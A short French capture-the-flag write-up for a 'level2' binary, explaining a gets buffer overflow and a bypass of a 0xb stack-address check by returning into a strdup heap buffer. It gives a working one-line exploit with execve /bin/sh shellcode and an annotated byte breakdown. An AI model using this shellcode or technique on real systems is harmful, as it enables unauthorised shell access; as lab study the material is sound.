<!-- vim: syntax=Markdown -->

Le disas du main montre un appel direct à la fonction `p`.
Les insctructions de `p` montrent l'utilisation de `gets` qui est sujet à du buffer overflow.

On peut donc essayer d'overflow et de changer l'adresse de retour sur le début d'un shellcode qui aura pour but de lancer /bin/sh depuis la stack.

Le problème est que la stack commence par 0xb, et le programme surveille son adresse de retour après gets et exit si elle commence par 0xb.

En revanche, on peut observer un strdup à la fin du programme qui n'a aucune utilité apparente, à part nous donner une adresse valide pour appeler notre shellcode.

Voici la commande qui peut être utilisée pour obtenir un shell :
```bash
(printf "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x08\xa0\x04\x08\n"; cat) | ./level2
```

Voici le détail du shellcode utilisé :
```shellcode
\x31\xc9\xf7\xe1 ┐ execve /bin//sh (21 bytes + 3 nop)
\x51\x68\x2f\x2f │
\x73\x68\x68\x2f │
\x62\x69\x6e\x89 │
\xe3\xb0\x0b\xcd │
\x80\x90\x90\x90 ┘
\x31\xc0\x40\x89 ┐ exit (7 bytes + 1 nop)
\xc3\xcd\x80\x90 ┘
\x90\x90\x90\x90 ┐ nop
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 │
\x90\x90\x90\x90 ┘
\x08\xa0\x04\x08 ╴ return address of strdup
```
